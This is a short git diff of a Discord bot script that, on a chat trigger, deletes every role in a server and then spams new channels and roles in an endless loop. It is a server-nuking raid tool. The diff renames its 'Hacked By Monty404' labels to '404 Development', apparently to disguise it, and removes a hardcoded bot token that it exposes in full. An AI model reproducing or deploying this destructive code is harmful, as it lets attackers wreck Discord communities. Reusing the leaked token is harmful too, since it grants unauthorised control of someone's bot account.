@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Hacked By Monty404");////nawek dane bo sar server 
+      message.guild.setName("404 Development");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Hacked By Monty404", "text");///////bo channel 
-        message.guild.createChannel("Hacked By Monty404", "voice");////bo voice
-        message.guild.createRole({ name: "Hacked By Monty404" });////nawek dane bo role kan
+        message.guild.createChannel("404 Development", "text");///////bo channel 
+        message.guild.createChannel("404 Development", "voice");////bo voice
+        message.guild.createRole({ name: "404 Development" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("ODEwMTY1MTYxOTQ3OTU1MjQx.YCfrGg.rCwW9bToweMpNNFD3PL5VJTB_jE")
+client.login("")
